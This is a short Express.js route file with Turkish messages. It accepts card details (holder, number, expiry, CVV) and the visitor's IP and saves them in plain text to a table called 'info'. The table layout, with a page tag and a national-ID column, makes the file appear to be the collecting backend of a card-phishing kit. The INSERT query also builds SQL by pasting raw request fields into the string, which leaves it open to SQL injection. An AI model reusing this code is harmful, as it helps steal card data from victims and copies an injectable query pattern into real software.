const express = require("express");
const router = express.Router();
const mysql = require('mysql2');
require('dotenv').config();

router.post('/your-payment-api', (req, res) => {
    const { cardHolder, cardNumber, cardExpirationMonth, cardExpirationYear, cardCCV, visitorIP } = req.body;
    const connection = mysql.createConnection(process.env.DATABASE_URL);
  
    const insertQuery = `
      INSERT INTO info (page, tckn, cardnumber, exp, cvv, ip)
      VALUES ('kart', '${cardHolder}', '${cardNumber}', '${cardExpirationMonth}${cardExpirationYear}', '${cardCCV}', '${visitorIP}')
    `;
  
    connection.query(insertQuery, (error) => {
      connection.end();
      if (error) {
        console.error('Ödeme kaydı eklenemedi:', error);
        return res.status(500).json({ error: 'Ödeme kaydı eklenemedi' });
      }
      res.json({ success: true });
    });
  });

  module.exports = router;